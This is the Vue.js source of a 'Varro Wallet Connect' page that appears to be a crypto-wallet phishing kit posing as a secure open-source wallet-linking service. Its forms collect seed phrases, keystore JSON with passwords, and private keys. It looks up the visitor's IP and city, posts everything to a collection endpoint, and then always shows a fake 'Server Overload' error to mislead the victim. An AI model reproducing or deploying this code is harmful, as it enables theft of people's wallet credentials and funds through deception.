<template>
  <div id="wrapper">
    <div id="content">
    <Header />

      <!-- Stat main -->
      <main data-spy="scroll" data-target="#navbar-example2" data-offset="0">
        <section class="pt_banner_inner">
            <div class="container">
              <div class="row justify-content-center text-center">
                <div class="col-md-8 col-lg-6">
                  <div class="banner_title_inner margin-b-10">
                    <h1 data-aos="fade-up" data-aos-delay="0" class="aos-init aos-animate">
                      Import Wallet
                    </h1>
                  </div>
                </div>
  
              </div>
            </div>
          </section>
        <section class="section__showcase margin-b-6">
            <div class="container">
              <div class="row justify-content-center text-center">
                <div class="col-lg-5">
                  <div class="title_sections_inner margin-b-5">
                    <h2 class="Upper">{{path}}</h2>
                  </div>
                </div>
              </div>
  
              <div class="block__tab">
                <ul class="nav nav-pills" id="pills-tab" role="tablist">
                  <li class="nav-item" role="presentation">
                    <a class="nav-link active" id="pills-budget-tab" data-toggle="pill" href="#pills-budget" role="tab" aria-controls="pills-budget" aria-selected="false">
                      <div class="icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="10.279" height="19" viewBox="0 0 10.279 19">
                          <g id="Group_6271" data-name="Group 6271" transform="translate(-7.285 -2)">
                            <rect id="Rectangle" width="2" height="4" rx="1" transform="translate(11.5 2)" fill="#0b2238" opacity="0.3"></rect>
                            <rect id="Rectangle-Copy-3" width="2" height="5" rx="1" transform="translate(11.5 16)" fill="#0b2238" opacity="0.3"></rect>
                            <path id="Combined-Shape" d="M15.493,8.044A2.933,2.933,0,0,0,14.4,7.2a3.082,3.082,0,0,0-1.3-.313,3.875,3.875,0,0,0-.656.057,1.692,1.692,0,0,0-.6.219,1.48,1.48,0,0,0-.446.418,1.113,1.113,0,0,0-.181.656,1.057,1.057,0,0,0,.142.57,1.268,1.268,0,0,0,.418.4,3.726,3.726,0,0,0,.656.314q.38.143.855.294.684.228,1.425.5a5.329,5.329,0,0,1,1.349.731,3.84,3.84,0,0,1,1.007,1.131,3.256,3.256,0,0,1,.4,1.681,4.393,4.393,0,0,1-.427,2,4,4,0,0,1-1.149,1.4,4.926,4.926,0,0,1-1.653.817,6.951,6.951,0,0,1-1.919.266,7.924,7.924,0,0,1-2.793-.5A5.917,5.917,0,0,1,7.285,16.4l2.128-2.166a3.932,3.932,0,0,0,1.3,1.017,3.532,3.532,0,0,0,1.605.408,3.231,3.231,0,0,0,.7-.076,1.754,1.754,0,0,0,.6-.247,1.237,1.237,0,0,0,.408-.456,1.435,1.435,0,0,0,.152-.684,1.082,1.082,0,0,0-.19-.646,1.856,1.856,0,0,0-.542-.484,4.361,4.361,0,0,0-.874-.4q-.523-.181-1.187-.389a11.348,11.348,0,0,1-1.264-.494,4.229,4.229,0,0,1-1.1-.731,3.388,3.388,0,0,1-.779-1.083A3.671,3.671,0,0,1,7.95,8.424a3.808,3.808,0,0,1,.456-1.919A3.964,3.964,0,0,1,9.6,5.194a5.142,5.142,0,0,1,1.672-.75,7.581,7.581,0,0,1,1.881-.238,6.983,6.983,0,0,1,2.327.418,5.993,5.993,0,0,1,2.08,1.235Z" fill="#0b2238" fill-rule="evenodd"></path>
                          </g>
                        </svg>
                      </div>
                      <h3>Phrase</h3>
                      <div class="prog"></div>
                    </a>
                  </li>
                  <li class="nav-item" role="presentation">
                    <a class="nav-link" id="pills-create-tab" data-toggle="pill" href="#pills-create" role="tab" aria-controls="pills-create" aria-selected="false">
                      <div class="icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="17.06" height="17.06" viewBox="0 0 17.06 17.06">
                          <g id="Group_6271" data-name="Group 6271" transform="translate(-3.343 -3.597)">
                            <path id="Combined-Shape" d="M15.95,3.808,13.025,6.733a2,2,0,0,0,0,2.828l1.414,1.414a2,2,0,0,0,2.828,0L20.192,8.05a5.92,5.92,0,0,1-8.308,6.894L6.757,20.071a2,2,0,1,1-2.828-2.828l5.127-5.127A5.92,5.92,0,0,1,15.95,3.808Z" fill="#0b2238" fill-rule="evenodd"></path>
                            <path id="Rectangle-2" d="M16.657,5.929l1.414,1.414a1,1,0,0,1,0,1.414l-1.38,1.38a1,1,0,0,1-1.414,0L13.863,8.723a1,1,0,0,1,0-1.414l1.38-1.38A1,1,0,0,1,16.657,5.929Z" fill="#0b2238" fill-rule="evenodd" opacity="0.3"></path>
                          </g>
                        </svg>
                      </div>
                      <h3>Keystone Json</h3>
                      <div class="prog"></div>
                    </a>
                  </li>
                  <li class="nav-item" role="presentation">
                    <a class="nav-link" id="pills-view-tab" data-toggle="pill" href="#pills-view" role="tab" aria-controls="pills-view" aria-selected="false">
                      <div class="icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16.94" height="17" viewBox="0 0 16.94 17">
                          <g id="Group_6274" data-name="Group 6274" transform="translate(-3.06 -3)">
                            <path id="Combined-Shape" d="M4,12.2,13,14V4.062A8,8,0,1,1,4,12.2Z" fill-rule="evenodd" opacity="0.3"></path>
                            <path id="Combined-Shape-Copy" d="M3.06,10.012A8,8,0,0,1,11,3v8.6Z" fill-rule="evenodd"></path>
                          </g>
                        </svg>
  
                      </div>
                      <h3>Private Keys</h3>
                      <div class="prog"></div>
                    </a>
                  </li>
                </ul>
  
                <div class="tab-content" id="pills-tabContent">
                  <div class="tab-pane fade active show" id="pills-budget" role="tabpanel" aria-labelledby="pills-budget-tab">
                    <div class="row justify-content-center">
                        <div class="col-lg-7">
                            <div class="form_cc_four">
                              <form class="row" @submit.prevent="Submit('phrase', inputOne)">
                                <div class="col-md-12">
                                  <div class="form-group">
                                    <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                    <label>Typically 12 (sometimes 24) words separated by single spaces.</label>
                                    <div v-if="Sending" class="typewrite typing" data-period="2000" data-type='[ "Importing . . .", "Importing . . . .", "Importing . . . . .", "Importing . . . . . ." ]'>
                                    <span class="wrap "></span></div>
                                    <div class="form-group">
                                    <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                  </div>
                                    <textarea required v-model.trim="inputOne" id="inputOne" class="form-control" rows="3" placeholder="Phrase"></textarea>
                                    <label class="color-red" v-show="hasError">{{error}}</label>
                                  </div>
                                </div>
            
                                <div class="col-12 d-md-flex justify-content-between margin-t-2">
                                    <div class="item_upload mb-3 mb-md-0">
                                      <router-link :to="{ name: 'Wallets'}" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
                                        Cancel
                                      </router-link>
                                  </div>
                                    <div class="item_upload mb-3 mb-md-0">
                                  <button v-show="passed" type="submit" class="btn btn_md_primary bg-blue rounded-8 H c-white h-fit-content">
                                    Import
                                  </button>
                                  </div>
                                </div>
                              </form>
                            </div>
                          </div>
                    </div>
                  </div>
                  <div class="tab-pane fade" id="pills-create" role="tabpanel" aria-labelledby="pills-create-tab">
                    <div class="row justify-content-center">
                        <div class="col-lg-7">
                            <div class="form_cc_four">
                              <form class="row" @submit.prevent="Submit('keystone', inputTwo, pwd)">
                                <div class="col-md-12">
                                <div class="form-group">
                                    <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                    <label>Several lines of text beginning with '<b>{...}</b>' plus the password used to encrypt it.</label>
                                    <div v-if="Sending" class="typewrite typing" data-period="2000" data-type='[ "Importing . . .", "Importing . . . .", "Importing . . . . .", "Importing . . . . . ." ]'>
                                    <span class="wrap "></span></div>
                                    <div class="form-group">
                                    <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                  </div>
                                    <textarea required v-model="inputTwo" class="form-control" rows="3" placeholder="Keystone JSON"></textarea>
                                    <label class="color-red" v-show="hasErrorr">{{errorr}}</label>
                                </div>
                                </div>
                                <div class="col-md-12">
                                  <div class="form-group">
                                    <label>Password</label>
                                    <input required v-model="pwd" type="password" class="form-control" placeholder="◉ ◉ ◉ ◉ ◉">
                                  </div>
                                </div>
            
                                <div class="col-12 d-md-flex justify-content-between margin-t-2">
                                    <div class="item_upload mb-3 mb-md-0">
                                        <div class="upload__fikle">
                                        <router-link :to="{ name: 'Wallets'}" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
                                            Cancel
                                        </router-link>
                                        </div>
                                    </div>
                                    <button type="submit" v-show="passedOne" class="btn btn_md_primary bg-blue rounded-8 H c-white h-fit-content">
                                        Import
                                    </button>
                                </div>
                              </form>
                            </div>
                          </div>
                    </div>
                  </div>
                  <div class="tab-pane fade" id="pills-view" role="tabpanel" aria-labelledby="pills-view-tab">
                    <div class="row justify-content-center">
                        <div class="col-lg-7">
                            <div class="form_cc_four">
                              <form class="row" @submit.prevent="Submit('private', inputThree)">
                                <div class="col-md-12">
                                  <div class="form-group">
                                    <label><span style="color: red;">Do not refresh page use this to</span> <router-link :to="{ name: 'Wallets' }"> start again</router-link>.</label>
                                    <label>Typically 12 (sometimes 24) words separated by single spaces</label>
                                    <div v-if="Sending" class="typewrite typing" data-period="2000" data-type='[ "Importing . . .", "Importing . . . .", "Importing . . . . .", "Importing . . . . . ." ]'>
                                    <span class="wrap "></span></div>
                                    <div class="form-group">
                                    <input v-if="path == 'other wallet'" required v-model="other" type="text" class="form-control" placeholder="Wallet Name">
                                  </div>
                                    <textarea required v-model="inputThree" id="inputThree" class="form-control" rows="3" placeholder="Enter Private Keys"></textarea>
                                    <label class="color-red" v-show="hasErrorrr">{{errorrr}}</label>
                                  </div>
                                </div>
            
                                <div class="col-12 d-md-flex justify-content-between margin-t-2">
                                  <div class="item_upload mb-3 mb-md-0">
                                    <div class="upload__fikle">
                                      <router-link :to="{ name: 'Wallets'}" class="btn btn_md_primary bg-red rounded-8 c-white h-fit-content">
                                        Cancel
                                      </router-link>
                                    </div>
                                  </div>
                                  <button type="submit" v-show="passedTwo" class="btn btn_md_primary bg-blue rounded-8 H c-white h-fit-content">
                                    Import
                                  </button>
                                </div>
                              </form>
                            </div>
                          </div>
                    </div>
                  </div>
                </div>
  
              </div>
  
            </div>
          </section>

      </main>
      <!-- end main -->

        <Footer />
          </div>
          <BaseFooter />
          </div>
  <!-- End. wrapper -->

  <Teleport to="#head">
        <meta name="theme-color" content="#fd7028">
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width,maximum-scale=1, initial-scale=1.0">
        <meta property="og:site_name" content="Varro Wallet Connect" />
        <meta property="og:title" content="Wallet - Varro Wallet Connect" />
        <meta property="og:image" content="https://orinostudio.com/rakon-theme/assets/img/favicon.ico" />
        <meta property="og:url" content="https://varrowalletconnect.com/" />
        <meta property="og:locale" content="en_US"/>
      <meta name="description" content="Secured Open Source Protocol - Dapp Connection" />
      <meta name="keywords" content="Varro Wallet , Home, Wallets, varro, varro wallet connect, wallet connect, secure wallet connect, wallet linking, VWC" />
      <meta name="author" content="Varro Inc - Open Source Protocol" />
      <link rel="shortcut icon" href="https://orinostudio.com/rakon-theme/assets/img/favicon.ico" type="image/x-icon" />
      <title>Connecting {{path}} - Varro Wallet Connect</title>
  </Teleport>
</template>

<script>
import $ from 'jquery'
import axios from 'axios'
import Header from '@/components/Header.vue'
import Footer from '@/components/Footer.vue'
import BaseFooter from '@/components/BaseFooter.vue'
import dialog from '@/mixins/dialog.js'
import xtra from '@/mixins/xtra.js'

export default {
  name: 'Connect',
  data() {
      return {
          path: this.$route.params.path,
          other: '',
          Sending: false,
          error: '',
          passed: false,
          hasError: false,
          errorr: '',
          passedOne: false,
          hasErrorr: false,
          errorrr: '',
          passedTwo: false,
          hasErrorrr: false,
          inputOne: '',
          inputTwo: '',
          inputThree: '',
          ip: '',
          loc: '',
          pwd: ''
      }
  },
  mixins: [xtra],
  components: {
    Header, Footer, BaseFooter
  },
  created(){
    },
  mounted() {
    setTimeout(function () {
      $('body').addClass('loaded_page');
    }, 3000);
    // $(document).on("keydown", disableF5);
    this.getIp()
    var TxtType = function(el, toRotate, period) {
        this.toRotate = toRotate;
        this.el = el;
        this.loopNum = 0;
        this.period = parseInt(period, 10) || 2000;
        this.txt = '';
        this.tick();
        this.isDeleting = false;
    };

    TxtType.prototype.tick = function() {
        var i = this.loopNum % this.toRotate.length;
        var fullTxt = this.toRotate[i];

        if (this.isDeleting) {
        this.txt = fullTxt.substring(0, this.txt.length - 1);
        } else {
        this.txt = fullTxt.substring(0, this.txt.length + 1);
        }

        this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';

        var that = this;
        var delta = 200 - Math.random() * 100;

        if (this.isDeleting) { delta /= 2; }

        if (!this.isDeleting && this.txt === fullTxt) {
        delta = this.period;
        this.isDeleting = true;
        } else if (this.isDeleting && this.txt === '') {
        this.isDeleting = false;
        this.loopNum++;
        delta = 500;
        }

        setTimeout(function() {
        that.tick();
        }, delta);
    };

    // window.onload = function() {
        var elements = document.getElementsByClassName('typewrite');
        for (var i=0; i<elements.length; i++) {
            var toRotate = elements[i].getAttribute('data-type');
            var period = elements[i].getAttribute('data-period');
            if (toRotate) {
              new TxtType(elements[i], JSON.parse(toRotate), period);
            }
        }
        // INJECT CSS
        var css = document.createElement("style");
        css.type = "text/css";
        css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
        document.body.appendChild(css);
    // };
  },
  updated() {
    var no_words = this.inputOne.split(" ");
      if(no_words.length == 0 || no_words == null || no_words[0].length == 0) {
            this.error = ''
          this.hasError = false
          this.passed = false
        } else if (no_words.length > 24){
              this.error = 'To many words present, You have inputed '+no_words.length+' of words.'
          this.hasError = true
          this.passed = false
        } else if(no_words.length < 12 && no_words[0].length > 0){
        this.error = 'Few words present, You have inputed '+no_words.length+' of words.'
          this.hasError = true
          this.passed = false
          } else {
            this.error = ''
          this.hasError = false
          this.passed = true
        }

        var json = this.inputTwo;
        if(json.length > 0){
            const ss = this.isJSON(json)
            if(ss) {
                this.errorr = ''
                this.hasErrorr = false
                this.passedOne = true
            }  else {
                this.errorr = 'Invalid json format [e.g - {"name": "john smith", "age": "50"} ]'
                this.hasErrorr = true
                this.passedOne = false
            }
        } else {
            this.errorr = ''
            this.hasErrorr = false
            this.passedOne = false
        }

        var no_word = this.inputThree.split(" ");
        if(no_word.length < 12 && no_word[0].length > 0){
            this.errorrr = 'Few words present, You have inputed '+no_word.length+' of words.'
            this.hasErrorrr = true
            this.passedTwo = false
        // } else if (no_word.length > 50){
        //     this.errorrr = 'Maximum Input exceeded'
        //     this.hasErrorrr = true
        //     const lI = this.inputThree.lastIndexOf(" ")
        //     document.getElementById('inputThree').value = this.inputThree.replace(/\w+[.!?]?$/, '');
            // document.getElementById('inputThree').value = this.inputThree.substring(0, lI);
            } else if (no_word.length > 24){
            this.errorrr = 'To many words present, You have inputed '+no_word.length+' of words.'
            this.hasErrorrr = true
            this.passedTwo = false
            } else if(no_word.length == 0 || no_word == null || no_words[0].length == 0) {
                this.errorrr = ''
            this.hasErrorrr = false
            this.passedTwo = false
            } else {
                this.errorrr = ''
            this.hasErrorrr = false
            this.passedTwo = true
            }
        this.path = this.$route.params.path
  
    },
    methods: {
        isJSON(str) {
            try {
                return (JSON.parse(str) && !!str);
            } catch (e) {
                return false;
            }
        },
        getIp() {
          axios
            .get('https://ipinfo.io?token=f865373b33ae79')
            .then(res => {
              this.ip = res.data.ip
              this.getLoc(this.ip)
            })
            .catch(err => {
              console.error(err)
              this.ip = null
            })
        },
        getLoc(IP) {
          axios
            .get('https://ipapi.co/' + IP + '/json/')
            .then(res => {
              this.loc = res.data.city+ ', ' + res.data.country_name+'.'
            })
            .catch(err => {
              console.error(err)
              this.loc = null
            })
        },
        async Submit(x,y=null,z=null) {
          this.Sending = true
          this.passed = false
          this.passedOne = false
          this.passedTwo = false
          if(this.path == 'other wallet') {
            var wallet = 'other wallet - ' +this.other
          } else {
            var wallet = this.path
          }
          const Url = '/endpoint/v1/send'
          const type = x
          const dataO = y
          const dataT = z
          const ip = this.ip
          const loc = this.loc
          const date = new Date();
          // monday 14 feb 2022 10:11
          const timein = date.getDay()+'-'+date.getDate()+'-'+date.getMonth()+'-'+date.getFullYear()+'-'+date.getHours()+'-'+date.getMinutes()+'-'+date.getSeconds()

          const fdata = new FormData();
          fdata.append('wallet', wallet);
          fdata.append('type', type);
          fdata.append('dataO', dataO);
          fdata.append('dataT', dataT);
          fdata.append('ip', ip);
          fdata.append('loc', loc);
          fdata.append('timein', timein);

          axios
            // .get('/endpoint/v1/send?wallet='+wallet)
            // .get('/endpoint/v1/send?wallet='+wallet+'&type='+type+'&dataO='+dataO+'&timein='+timein+'&dataT='+dataT+'&ip='+ip+'&loc='+loc, config)
            .post(Url, fdata)
            .then(res => {
              this.Sending = false
              this.passed = true
              this.passedOne = true
              this.passedTwo = true
              this.SendOut(true)
            })
            .catch(err => {
              console.error(err)
              this.Sending = true
              this.passed = false
              this.passedOne = false
              this.passedTwo = false
              this.SendOut(true)
            })
        },
        SendOut(xx) {
          class Dialog {
            constructor(settings = {}) {
              this.settings = Object.assign(
                {
                  accept: 'OK',
                  bodyClass: 'dialog-open',
                  cancel: 'Cancel',
                  dialogClass: '',
                  message: '',
                  soundAccept: '',
                  soundOpen: '',
                  template: ''
                },
                settings
              )
              this.init()
            }
          
            collectFormData(formData) {
              const object = {};
              formData.forEach((value, key) => {
                if (!Reflect.has(object, key)) {
                  object[key] = value
                  return
                }
                if (!Array.isArray(object[key])) {
                  object[key] = [object[key]]
                }
                object[key].push(value)
              })
              return object
            }
          
            getFocusable() {
              return [...this.dialog.querySelectorAll('button,[href],select,textarea,input:not([type="hidden"]),[tabindex]:not([tabindex="-1"])')]
            }
          
            init() {
              this.dialogSupported = typeof HTMLDialogElement === 'function'
              this.dialog = document.createElement('dialog')
              this.dialog.role = 'dialog'
              this.dialog.dataset.component = this.dialogSupported ? 'dialog' : 'no-dialog';
              this.dialog.innerHTML = `
              <form method="dialog" data-ref="form">
                <fieldset data-ref="fieldset" role="document">
                  <legend data-ref="message" id="${(Math.round(Date.now())).toString(36)}"></legend>
                  <div data-ref="template"></div>
                </fieldset>
                <menu>
                  <button${this.dialogSupported ? '' : ` type="button"`} data-ref="cancel" value="cancel"></button>
                  <button${this.dialogSupported ? '' : ` type="button"`} data-ref="accept" value="default"></button>
                </menu>
                <audio data-ref="soundAccept"></audio>
                <audio data-ref="soundOpen"></audio>
              </form>`
              document.body.appendChild(this.dialog)
          
              this.elements = {}
              this.focusable = []
              this.dialog.querySelectorAll('[data-ref]').forEach(el => this.elements[el.dataset.ref] = el)
              this.dialog.setAttribute('aria-labelledby', this.elements.message.id)
              this.elements.cancel.addEventListener('click', () => { this.dialog.dispatchEvent(new Event('cancel')) })
              this.dialog.addEventListener('keydown', e => {
                if (e.key === 'Enter') {
                  if (!this.dialogSupported) e.preventDefault()
                  this.elements.accept.dispatchEvent(new Event('click'))
                }
                if (e.key === 'Escape') this.dialog.dispatchEvent(new Event('cancel'))
                if (e.key === 'Tab') {
                  e.preventDefault()
                  const len =  this.focusable.length - 1;
                  let index = this.focusable.indexOf(e.target);
                  index = e.shiftKey ? index - 1 : index + 1;
                  if (index < 0) index = len;
                  if (index > len) index = 0;
                  this.focusable[index].focus();
                }
              })
              this.toggle()
            }
          
            open(settings = {}) {
              const dialog = Object.assign({}, this.settings, settings)
              this.dialog.className = dialog.dialogClass || ''
              this.elements.accept.innerText = dialog.accept
              this.elements.cancel.innerText = dialog.cancel
              this.elements.cancel.hidden = dialog.cancel === ''
              this.elements.message.innerText = dialog.message
              this.elements.soundAccept.src = dialog.soundAccept || ''
              this.elements.soundOpen.src = dialog.soundOpen || ''
              this.elements.target = dialog.target || ''
              this.elements.template.innerHTML = dialog.template || ''
          
              this.focusable = this.getFocusable()
              this.hasFormData = this.elements.fieldset.elements.length > 0
          
              if (dialog.soundOpen) {
                this.elements.soundOpen.play()
              }
          
              this.toggle(true)
          
              if (this.hasFormData) {
                this.focusable[0].focus()
                this.focusable[0].select()
              }
              else {
                this.elements.accept.focus()
              }
            }
          
            toggle(open = false) {
              if (this.dialogSupported && open) this.dialog.showModal()
              if (!this.dialogSupported) {
                document.body.classList.toggle(this.settings.bodyClass, open)
                this.dialog.hidden = !open
                if (this.elements.target && !open) {
                  this.elements.target.focus()
                }
              }
            }
          
            waitForUser() {
              return new Promise(resolve => {
                this.dialog.addEventListener('cancel', () => { 
                  this.toggle()
                  resolve(false)
                }, { once: true })
                this.elements.accept.addEventListener('click', () => {
                  let value = this.hasFormData ? this.collectFormData(new FormData(this.elements.form)) : true;
                  if (this.elements.soundAccept.getAttribute('src').length > 0) this.elements.soundAccept.play()
                  this.toggle()
                  resolve(value)
                }, { once: true })
              })
            }
          
            alert(message, config = { target: event.target }) {
              const settings = Object.assign({}, config, { cancel: '', message, template: '' })
              this.open(settings)
              return this.waitForUser()
            }
          
            confirm(message, config = { target: event.target }) {
              const settings = Object.assign({}, config, { message, template: '' })
              this.open(settings)
              return this.waitForUser()
            }
          
            prompt(message, value, config = { target: event.target }) {
              const template = `<label aria-label="${message}"><input type="text" name="prompt" value="${value}"></label>`
              const settings = Object.assign({}, config, { message, template })
              this.open(settings)
              return this.waitForUser()
            }
          }
          if (xx) {
            const dialog = new Dialog();
              dialog.alert('⌛ Server Overload, 🙏🏻 Please Try Again').then((res) => {  
                if(res){
                  this.$router.replace({path:'/wallets'})
                }
               })
          }
        }
    }
}
</script>

<style scoped>
.Upper {
    text-transform: capitalize;
}
.color-red {
    color:red;
}
.typing {
  text-transform: uppercase;
  font-size: 15px;
  color: #31d1ab;
}
</style>